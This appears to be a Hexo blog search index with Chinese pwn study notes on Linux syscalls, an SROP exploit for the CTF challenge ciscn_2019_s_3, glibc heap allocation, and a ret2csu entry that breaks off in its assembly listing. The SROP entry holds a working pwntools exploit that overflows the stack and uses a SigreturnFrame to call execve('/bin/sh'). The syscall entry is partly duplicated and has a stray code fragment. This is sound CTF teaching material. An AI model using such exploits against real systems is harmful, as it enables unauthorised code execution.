<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于布置栈的见解</title>
    <link href="/2024/10/15/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <url>/2024/10/15/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="系统调用概述"><a href="#系统调用概述" class="headerlink" title="系统调用概述"></a>系统调用概述</h2><p>计算机系统的各种硬件资源是有限的，在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，为了更好的管理这些资源进程是不允许直接操作的，所有对这些资源的访问都必须有操作系统控制。也就是说操作系统是使用这些资源的唯一入口，而这个入口就是操作系统提供的<strong>系统调用（System Call）</strong>。在linux中系统调用是用户空间访问内核的唯一手段，除异常和陷入外，他们是内核唯一的合法入口。</p><p>一般情况下应用程序通过应用编程接口API，而不是直接通过系统调用来编程。在Unix世界，最流行的API是基于POSIX标准的。</p><p>操作系统一般是通过中断从用户态切换到内核态。中断就是一个硬件或软件请求，要求CPU暂停当前的工作，去处理更重要的事情。比如，在x86机器上可以通过int指令进行软件中断，而在磁盘完成读写操作后会向CPU发起硬件中断。</p><p>中断有两个重要的属性，中断号和中断处理程序。中断号用来标识不同的中断，不同的中断具有不同的中断处理程序。在操作系统内核中维护着一个中断向量表（Interrupt Vector Table），这个数组存储了所有中断处理程序的地址，而中断号就是相应中断在中断向量表中的偏移量。</p><p>一般地，系统调用都是通过软件中断实现的，x86系统上的软件中断由int $0x80指令产生，而128号异常处理程序就是系统调用处理程序system_call()，它与硬件体系有关，在entry.S中用汇编写。接下来就来看一下Linux下系统调用具体的实现过程。</p><h2 id="为什么需要系统调用"><a href="#为什么需要系统调用" class="headerlink" title="为什么需要系统调用"></a>为什么需要系统调用</h2><p>linux内核中设置了一组用于实现系统功能的子程序，称为系统调用。系统调用和普通库函数调用非常相似，只是系统调用由操作系统核心提供，运行于<strong>内核态</strong>，而普通的函数调用由函数库或用户自己提供，运行于<strong>用户态</strong>。</p><p>一般的，进程是不能访问内核的。它不能访问内核所占内存空间也不能调用内核函数。CPU硬件决定了这些（这就是为什么它被称作<strong>“保护模式”</strong>）。</p><p>为了和用户空间上运行的进程进行交互，内核提供了一组接口。透过该接口，应用程序可以访问硬件设备和其他操作系统资源。这组接口在应用程序和内核之间扮演了使者的角色，应用程序发送各种请求，而内核负责满足这些请求(或者让应用程序暂时搁置)。实际上提供这组接口主要是为了保证系统稳定可靠，避免应用程序肆意妄行，惹出大麻烦。</p><p>系统调用在用户空间进程和硬件设备之间添加了一个中间层。该层主要作用有三个：</p><p>1、它为用户空间提供了一种统一的硬件的抽象接口。比如当需要读些文件的时候，应用程序就可以不去管磁盘类型和介质，甚至不用去管文件所在的文件系统到底是哪种类型。</p><p>2、系统调用保证了系统的稳定和安全。作为硬件设备和应用程序之间的中间人，内核可以基于权限和其他一些规则对需要进行的访问进行裁决。举例来说，这样可以避免应用程序不正确地使用硬件设备，窃取其他进程的资源，或做出其他什么危害系统的事情。</p><p>3、每个进程都运行在虚拟系统中，而在用户空间和系统的其余部分提供这样一层公共接口，也是出于这种考虑。如果应用程序可以随意访问硬件而内核又对此一无所知的话，几乎就没法实现多任务和虚拟内存，当然也不可能实现良好的稳定性和安全性。在Linux中，系统调用是用户空间访问内核的惟一手段；除异常和中断外，它们是内核惟一的合法入口。</p><h2 id="API-POSIX-C库的区别与联系"><a href="#API-POSIX-C库的区别与联系" class="headerlink" title="API&#x2F;POSIX&#x2F;C库的区别与联系"></a>API&#x2F;POSIX&#x2F;C库的区别与联系</h2><p>一般情况下，应用程序通过应用编程接口(API)而不是直接通过系统调用来编程。这点很重要，因为应用程序使用的这种编程接口实际上并不需要和内核提供的系统调用一一对应。</p><blockquote><p>一个API定义了一组应用程序使用的编程接口。它们可以实现成一个系统调用，也可以通过调用多个系统调用来实现，而完全不使用任何系统调用也不存在问题。实际上，API可以在各种不同的操作系统上实现，给应用程序提供完全相同的接口，而它们本身在这些系统上的实现却可能迥异。</p></blockquote><p>在Unix世界中，最流行的应用编程接口是基于POSIX标准的，其目标是提供一套大体上基于Unix的可移植操作系统标准。POSIX是说明API和系统调用之间关系的一个极好例子。在大多数Unix系统上，根据POSIX而定义的API函数和系统调用之间有着直接关系。</p><p>Linux的系统调用像大多数Unix系统一样，作为C库的一部分提供如下图所示。C库实现了 Unix系统的主要API，包括标准C库函数和系统调用。所有的C程序都可以使用C库，而由于C语言本身的特点，其他语言也可以很方便地把它们封装起来使用。</p><p>从程序员的角度看，系统调用无关紧要，他们只需要跟API打交道就可以了。相反，内核只跟系统调用打交道；库函数及应用程序是怎么使用系统调用不是内核所关心的。</p><p>关于Unix的界面设计有一句通用的格言“提供机制而不是策略”。换句话说，Unix的系统调用抽象出了用于完成某种确定目的的函数。至干这些函数怎么用完全不需要内核去关心。区别对待机制(mechanism)和策略(policy)是Unix设计中的一大亮点。大部分的编程问题都可以被切割成两个部分:“需要提供什么功能”(机制)和“怎样实现这些功能”(策略)。</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>api是函数的定义，规定了这个函数的功能，跟内核无直接关系。而系统调用是通过中断向内核发请求，实现内核提供的某些服务。</p><h2 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h2><p>一个api可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。<br>程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。<br>因此，API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。<br>系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。<br>并不是所有的API函数都一一对应一个系统调用，有时，一个API函数会需要几个系统调用来共同完成函数的功能，甚至还有一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）系统调用概述</p><p>计算机系统的各种硬件资源是有限的，在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，为了更好的管理这些资源进程是不允许直接操作的，所有对这些资源的访问都必须有操作系统控制。也就是说操作系统是使用这些资源的唯一入口，而这个入口就是操作系统提供的<strong>系统调用（System Call）</strong>。在linux中系统调用是用户空间访问内核的唯一手段，除异常和陷入外，他们是内核唯一的合法入口。</p><p>一般情况下应用程序通过应用编程接口API，而不是直接通过系统调用来编程。在Unix世界，最流行的API是基于POSIX标准的。</p><p>操作系统一般是通过中断从用户态切换到内核态。中断就是一个硬件或软件请求，要求CPU暂停当前的工作，去处理更重要的事情。比如，在x86机器上可以通过int指令进行软件中断，而在磁盘完成读写操作后会向CPU发起硬件中断。</p><p>中断有两个重要的属性，中断号和中断处理程序。中断号用来标识不同的中断，不同的中断具有不同的中断处理程序。在操作系统内核中维护着一个中断向量表（Interrupt Vector Table），这个数组存储了所有中断处理程序的地址，而中断号就是相应中断在中断向量表中的偏移量。</p><p>一般地，系统调用都是通过软件中断实现的，x86系统上的软件中断由int $0x80指令产生，而128号异常处理程序就是系统调用处理程序system_call()，它与硬件体系有关，在entry.S中用汇编写。接下来就来看一下Linux下系统调用具体的实现过程。</p><h2 id="为什么需要系统调用-1"><a href="#为什么需要系统调用-1" class="headerlink" title="为什么需要系统调用"></a>为什么需要系统调用</h2><p>xxxxxxxxxx line &#x3D; p.recvline().decode().strip()#.decode()：将接收到的字节串转换为Python字符串。#.strip()：去除字符串开头和结尾的空格和换行符。match &#x3D; re.search(r’0x[0-9a-fA-F]+’, line)value &#x3D; match.group(0)#返回第一个匹配到的字符串python</p><p>一般的，进程是不能访问内核的。它不能访问内核所占内存空间也不能调用内核函数。CPU硬件决定了这些（这就是为什么它被称作<strong>“保护模式”</strong>）。</p><p>为了和用户空间上运行的进程进行交互，内核提供了一组接口。透过该接口，应用程序可以访问硬件设备和其他操作系统资源。这组接口在应用程序和内核之间扮演了使者的角色，应用程序发送各种请求，而内核负责满足这些请求(或者让应用程序暂时搁置)。实际上提供这组接口主要是为了保证系统稳定可靠，避免应用程序肆意妄行，惹出大麻烦。</p><p>系统调用在用户空间进程和硬件设备之间添加了一个中间层。该层主要作用有三个：</p><p>1、它为用户空间提供了一种统一的硬件的抽象接口。比如当需要读些文件的时候，应用程序就可以不去管磁盘类型和介质，甚至不用去管文件所在的文件系统到底是哪种类型。</p><p>2、系统调用保证了系统的稳定和安全。作为硬件设备和应用程序之间的中间人，内核可以基于权限和其他一些规则对需要进行的访问进行裁决。举例来说，这样可以避免应用程序不正确地使用硬件设备，窃取其他进程的资源，或做出其他什么危害系统的事情。</p><p>3、每个进程都运行在虚拟系统中，而在用户空间和系统的其余部分提供这样一层公共接口，也是出于这种考虑。如果应用程序可以随意访问硬件而内核又对此一无所知的话，几乎就没法实现多任务和虚拟内存，当然也不可能实现良好的稳定性和安全性。在Linux中，系统调用是用户空间访问内核的惟一手段；除异常和中断外，它们是内核惟一的合法入口。</p><h2 id="API-POSIX-C库的区别与联系-1"><a href="#API-POSIX-C库的区别与联系-1" class="headerlink" title="API&#x2F;POSIX&#x2F;C库的区别与联系"></a>API&#x2F;POSIX&#x2F;C库的区别与联系</h2><p>一般情况下，应用程序通过应用编程接口(API)而不是直接通过系统调用来编程。这点很重要，因为应用程序使用的这种编程接口实际上并不需要和内核提供的系统调用一一对应。</p><blockquote><p>一个API定义了一组应用程序使用的编程接口。它们可以实现成一个系统调用，也可以通过调用多个系统调用来实现，而完全不使用任何系统调用也不存在问题。实际上，API可以在各种不同的操作系统上实现，给应用程序提供完全相同的接口，而它们本身在这些系统上的实现却可能迥异。</p></blockquote><p>在Unix世界中，最流行的应用编程接口是基于POSIX标准的，其目标是提供一套大体上基于Unix的可移植操作系统标准。POSIX是说明API和系统调用之间关系的一个极好例子。在大多数Unix系统上，根据POSIX而定义的API函数和系统调用之间有着直接关系。</p><p>Linux的系统调用像大多数Unix系统一样，作为C库的一部分提供如下图所示。C库实现了 Unix系统的主要API，包括标准C库函数和系统调用。所有的C程序都可以使用C库，而由于C语言本身的特点，其他语言也可以很方便地把它们封装起来使用。</p><p>从程序员的角度看，系统调用无关紧要，他们只需要跟API打交道就可以了。相反，内核只跟系统调用打交道；库函数及应用程序是怎么使用系统调用不是内核所关心的。</p><p>关于Unix的界面设计有一句通用的格言“提供机制而不是策略”。换句话说，Unix的系统调用抽象出了用于完成某种确定目的的函数。至干这些函数怎么用完全不需要内核去关心。区别对待机制(mechanism)和策略(policy)是Unix设计中的一大亮点。大部分的编程问题都可以被切割成两个部分:“需要提供什么功能”(机制)和“怎样实现这些功能”(策略)。</p><h2 id="区别-1"><a href="#区别-1" class="headerlink" title="区别"></a>区别</h2><p>api是函数的定义，规定了这个函数的功能，跟内核无直接关系。而系统调用是通过中断向内核发请求，实现内核提供的某些服务。</p><h2 id="联系-1"><a href="#联系-1" class="headerlink" title="联系"></a>联系</h2><p>一个api可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。<br>程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。<br>因此，API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。<br>系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。<br>并不是所有的API函数都一一对应一个系统调用，有时，一个API函数会需要几个系统调用来共同完成函数的功能，甚至还有一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP（利用signal机制）</title>
    <link href="/2024/10/15/SROP/"/>
    <url>/2024/10/15/SROP/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SROP（利用signal机制）"><a href="#SROP（利用signal机制）" class="headerlink" title="SROP（利用signal机制）"></a>SROP（利用signal机制）</h2><p>例题：ciscn_2019_s_3</p><p>程序较短，感觉直接看汇编比较好(该程序由内联汇编写成的)</p><p>首先了解一下64位的系统调用</p><p>传参方式：首先将系统调用号传入rax，然后将参数从左到右依次存入rdi，rsi，rdx等寄存器中，返回值存在rax寄存器</p><p>调用号：sys_read的调用号为0，sys_write的调用号为1，stub_execve的调用号为59，stub_rt_sigreturn的调用号为15</p><p>调用方式：使用syscall进行系统调用</p><p>在函数gadgets中直接暗示了接下来要使用的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000000004004D6                               ; Attributes: bp-based frame<br>.text:00000000004004D6<br>.text:00000000004004D6                               public gadgets<br>.text:00000000004004D6                               gadgets proc near<br>.text:00000000004004D6                               ; __unwind &#123;<br>.text:00000000004004D6 55                            push    rbp<br>.text:00000000004004D7 48 89 E5                      mov     rbp, rsp<br>.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh<br>.text:00000000004004E1 C3                            retn<br>.text:00000000004004E1<br>.text:00000000004004E1                               gadgets endp ; sp-analysis failed<br>.text:00000000004004E1<br>.text:00000000004004E2                               ; ---------------------------------------------------------------------------<br>.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;<br>.text:00000000004004E9 C3                            retn<br>.text:00000000004004E9<br>.text:00000000004004E9                               ; ---------------------------------------------------------------------------<br>.text:00000000004004EA 90                            db 90h<br>.text:00000000004004EB                               ; ---------------------------------------------------------------------------<br>.text:00000000004004EB 5D                            pop     rbp<br>.text:00000000004004EC C3                            retn<br></code></pre></td></tr></table></figure><p>​可以看到有mov rax， 3Bh指令，将rax设置为3B(59),也就是execve的函数调用号，execve函数的作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell，python脚本，和system函数类似，记录一下该指令的地址 gadget_addr&#x3D;0x4004e2。</p><p>​在这个调用execve的函数里也看到了return，我们可以利用这个return继续控制程序执行流，接下来就是去设置execve函数的参数，通过pop指令去控制函数参数，让rdi&#x3D;&#x2F;bin&#x2F;sh，rsi&#x3D;0，rdx&#x3D;0（64位程序参数传递顺序rdi，rsi，rdx，rcx，r8，r9），形成execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)的系统调用，即可获得shell。</p><p>vuln函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v0 = sys_read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x400</span>uLL);<br>  <span class="hljs-keyword">return</span> sys_write(<span class="hljs-number">1u</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>&#125;<br><span class="hljs-keyword">asm</span>：<br>    .text:<span class="hljs-number">00000000004004</span>ED                               ; __unwind &#123;<br>.text:<span class="hljs-number">00000000004004</span>ED <span class="hljs-number">55</span>                            push    rbp<br>.text:<span class="hljs-number">00000000004004</span>EE <span class="hljs-number">48</span> <span class="hljs-number">89</span> E5                      mov     rbp, rsp<br>.text:<span class="hljs-number">00000000004004F</span>1 <span class="hljs-number">48</span> <span class="hljs-number">31</span> C0                      xor     rax, rax<br>.text:<span class="hljs-number">00000000004004F</span>4 BA <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                mov     edx, <span class="hljs-number">400</span>h                       ; count<br>.text:<span class="hljs-number">00000000004004F</span>9 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">74</span> <span class="hljs-number">24</span> F0                lea     rsi, [rsp+buf]                  ; buf<br>.text:<span class="hljs-number">00000000004004F</span>E <span class="hljs-number">48</span> <span class="hljs-number">89</span> C7                      mov     rdi, rax                        ; fd<br>.text:<span class="hljs-number">0000000000400501</span> <span class="hljs-number">0F</span> <span class="hljs-number">05</span>                         syscall                                 ; LINUX - sys_read<br>.text:<span class="hljs-number">0000000000400503</span> <span class="hljs-number">48</span> C7 C0 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rax, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">000000000040050</span>A BA <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                mov     edx, <span class="hljs-number">30</span>h ; <span class="hljs-string">&#x27;0&#x27;</span>                  ; count<br>.text:<span class="hljs-number">000000000040050F</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">74</span> <span class="hljs-number">24</span> F0                lea     rsi, [rsp+buf]                  ; buf<br>.text:<span class="hljs-number">0000000000400514</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> C7                      mov     rdi, rax                        ; fd<br>.text:<span class="hljs-number">0000000000400517</span> <span class="hljs-number">0F</span> <span class="hljs-number">05</span>                         syscall                                 ; LINUX - sys_write<br>.text:<span class="hljs-number">0000000000400519</span> C3                            retn<br></code></pre></td></tr></table></figure><p>buf距离rbp栈底只有0x10个字节，buf却可以读入0x400，所以存在栈溢出</p><p>retn其实就是pop eip，eip寄存器一般用于存放我们下一条要执行的指令的地址，所以pop eip这条指令可以让我们控制程序的跳转。</p><p>注意这里的vuln和gadget函数都有一个特点，那就是函数末尾没有leave指令，在执行完之后不会恢复rbp和rsp到上一个栈帧，原先rbp值保存的位置变成了返回地址的位置。也就是说vuln函数的buf参数在溢出的时候只要输入长度为10的数据之后覆盖rbp,就能够控制程序。</p><p>所以利用过程：</p><p>构造第一次溢出，返回到main函数，由于write输出的是0x30字节长度的内容，因此会泄露一部分的栈地址，泄露栈地址之后计算一下栈顶的位置，将rip设置到栈顶的位置，下一次payload发送&#x2F;bin&#x2F;sh，</p><p><img src="C:\Users\lpp\Desktop\笔记\pwn\1715247137615.png" alt="1715247137615"></p><p>输入点的地址是栈顶738-5f0&#x3D;0x148</p><p>所以接受地址后减去偏移就是栈起始地址</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(a)<br>    pause()<br>gadget=<span class="hljs-number">0x00000000004004DA</span><br>main=<span class="hljs-number">0x00000000004004ED</span><br>syscall=<span class="hljs-number">0x400517</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span>+p64(main)<br>debug()<br>a.send(payload)<br>stack_addr=u64(a.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-<span class="hljs-number">0x148</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-comment">#debug()</span><br>frame=SigreturnFrame()<br>frame.rax=<span class="hljs-number">59</span><br>frame.rdi=stack_addr<br>frame.rip=syscall<br>frame.rsi=<span class="hljs-number">0</span><br><br><span class="hljs-comment"># frame=SigreturnFrame(): 这一行创建了一个SigreturnFrame对象，用于构造srop payload。SigreturnFrame是pwntools库中的一个类，用于构造srop时所需的寄存器状态。</span><br><br><span class="hljs-comment"># frame.rax=59: 这一行设置了rax寄存器的值为59。在Linux中，rax寄存器用于存储系统调用号，59代表execve系统调用。</span><br><br><span class="hljs-comment"># frame.rdi=stack_addr: 这一行设置了rdi寄存器的值为stack_addr，其中stack_addr是一个变量，应该是指向字符串&quot;/bin/sh\x00&quot;的地址。在execve系统调用中，rdi寄存器通常存储的是要执行的程序的路径。</span><br><br><span class="hljs-comment"># frame.rip=syscall: 这一行设置了rip寄存器的值为syscall，其中syscall应该是一个指向系统调用指令的地址。在srop中，通过修改rip寄存器来控制程序执行流程，从而触发系统调用。</span><br><br><span class="hljs-comment"># frame.rsi=0: 这一行设置了rsi寄存器的值为0。在execve系统调用中，rsi寄存器通常存储的是传递给被执行程序的命令行参数，而这里将其设置为0，表示没有命令行参数。</span><br><br><span class="hljs-comment"># 综上所述，这段代码的作用是构造一个srop payload，用于执行execve(&quot;/bin/sh&quot;, NULL, NULL)系统调用，从而获取一个shell。</span><br>payload2=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(gadget)+p64(syscall)+<span class="hljs-built_in">bytes</span>(frame)<br><span class="hljs-comment">#a.send(payload2)</span><br>a.interactive()<br><br><span class="hljs-comment"># buf: 0x7ffea5126580 ◂— 0x61616161610a6161 (&#x27;aa\naaaaa&#x27;)</span><br><span class="hljs-comment">#0x7ffea51266c8</span><br><br></code></pre></td></tr></table></figure><p>讲一下payload2，将&#x2F;bin&#x2F;sh存入buf中将buf空间补全到0x10到达栈底，pop rbp指向gadget，gadget 将3Bpop到syscall函数，进行系统调用 也就是新程序的执行，然后利用pwntools集成的sign机制，将rax设置成59，rdi指向存binsh的栈地址（在这里第二次输入的时候栈已经抬高，重新动调一下看一下新栈的位置），rip指针指向syscall进行系统调用，然后获得shell</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc堆管理机制</title>
    <link href="/2024/10/15/glibc%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/10/15/glibc%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="glibc堆管理机制"><a href="#glibc堆管理机制" class="headerlink" title="glibc堆管理机制"></a>glibc堆管理机制</h2><h3 id="Memory-ALLcator"><a href="#Memory-ALLcator" class="headerlink" title="Memory ALLcator"></a>Memory ALLcator</h3><p>常见的内存管理机制：</p><p>​dlmalloc：通用分配器</p><p>​ptmalloc：glibc分配器，继承自dlmalloc，并提供了多线程支持，主要研究对象</p><p>​jemalloc：Firefox</p><p>​tcmalloc：Chrome</p><p>​其他：编程语言内存分配及回收，比如python</p><h3 id="malloc工作机制"><a href="#malloc工作机制" class="headerlink" title="malloc工作机制"></a>malloc工作机制</h3><p>第一次调用malloc</p><p>如果调用分配大小大于128kb，会去调用mmap函数，交由内核函数sys_mmap处理</p><p>如果调用分配大小小于128kb，会去调用brk()函数，交由内核函数sys_brk处理</p><h3 id="内存分配机制"><a href="#内存分配机制" class="headerlink" title="内存分配机制"></a>内存分配机制</h3><p>头文件：#include&lt;unistd.h&gt;</p><p>​brk()：</p><p>​函数原型：int brk (void*end_data_segment)</p><p>​功能和作用：用于设置program_break指向的位置</p><p>​sbrk()</p><p>​函数原型：void* sbrk(intptr_t increment)</p><p>​功能和作用：同brk()，参数可以是负数。执行成功返回上一次program_break的值，可以设置参数为0返回当</p><p>前的program_break.</p><p>​mmap()</p><p>​功能和作用：当用户申请空间大于等于128kb，也就是0x20000字节时，不再使用brk()进行分配，改为使用</p><p>mmap()。</p><p>​unmmap()</p><p>​功能和作用：堆mmap()申请的空间进行回收。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP-ret2__libc_csu_init（64位ELF）</title>
    <link href="/2024/10/15/ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/"/>
    <url>/2024/10/15/ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ROP-ret2-libc-csu-init（64位ELF）"><a href="#ROP-ret2-libc-csu-init（64位ELF）" class="headerlink" title="ROP-ret2__libc_csu_init（64位ELF）"></a>ROP-ret2__libc_csu_init（64位ELF）</h2><p> 首先64位文件传参方式：当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9。</p><p>当参数为7个以上时，前六个与前面一样，但后面的要依次放入栈中，即和32位程序一样。</p><p>例子：function(a,b,c,d,e,f,g,h)</p><p>参数a放入rdi，参数b放入rsi，参数c放入rdx，参数d放入rcx，参数e放入r8，参数f放入r9</p><p>剩下的h，g都存放到esp，call function。</p><h4 id="ROP-ret2-libc-csu-init的利用方法"><a href="#ROP-ret2-libc-csu-init的利用方法" class="headerlink" title="ROP-ret2__libc_csu_init的利用方法"></a>ROP-ret2__libc_csu_init的利用方法</h4><p>在64位程序中，函数的前六个参数是通过寄存器来传递的，但很多时候，很难找到每一个寄存器对应的gadgets。这时候可以利用x64下的__libc_csu_init中的gadgets，这个函数是用来对libc进行初始化操作的，一般程序都会调用libc函数，所以一定存在这个函数.</p><p>下面是整个函数的汇编，存在可利用的点，从000000000040061A到结尾，我们可以利用栈溢出构造栈上的数据来控制rbx，rbp，r12，r13，r14，r15寄存器的数据（都是向寄存器进行pop）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000000004005C0                                   ; void __fastcall _libc_csu_init(unsigned int, __int64, 